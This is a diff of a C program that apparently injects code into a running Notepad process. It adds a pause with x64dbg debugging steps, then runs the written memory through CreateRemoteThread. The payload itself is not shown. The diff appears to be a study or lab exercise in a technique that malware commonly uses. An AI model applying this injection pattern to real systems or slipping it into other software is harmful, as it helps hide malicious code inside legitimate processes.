@@ -82,12 +82,41 @@ int main(void) {
         return 1;
     }
 
-    printf("[+] WriteProcessMemory succeeded!\n");
-    printf("[+] Bytes written: %zu\n", bytesWritten);
-    CloseHandle(hProcess);
+    printf("[+] WriteProcessMemory successful! Bytes Written : %zu\n", bytesWritten);
 
+    // === DEBUG PAUSE ===
+    printf("\n======================================================================\n");
+    printf("[!] PAUSED FOR DEBUGGING:\n");
+    printf("    1. Open x64dbg -> File -> Attach -> Select PID %lu (Notepad)\n", targetPid);
+    printf("    2. Go to Address 0x%p in x64dbg (Memory Map or Ctrl+G)\n", allocatedAddress);
+    printf("    3. Set Breakpoint (F2) on 0x%p and press F9 (Run) in x64dbg\n", allocatedAddress);
+    printf("======================================================================\n");
+    printf("[*] Press ENTER in this console to trigger CreateRemoteThread...\n");
+    getchar(); getchar(); 
+
+    // Static CreateRemoteThread
+    HANDLE hThread = CreateRemoteThread(
+        hProcess,
+        NULL,
+        0,
+        (LPTHREAD_START_ROUTINE)allocatedAddress,
+        NULL,
+        0,
+        NULL
+    );
+
+    if (hThread == NULL) {
+        printf("[-] CreateRemoteThread failed. Error: %lu\n", GetLastError());
+    } else {
+        printf("[+] CreateRemoteThread successful! Thread Handle : 0x%p\n", hThread);
+        CloseHandle(hThread);
+    }
+
+    CloseHandle(hProcess);
     printf("[+] Process handle closed successfully.\n");
+
+    printf("\n[*] Press ENTER to exit program...");
+    getchar();
 
     return 0;
 }
-    
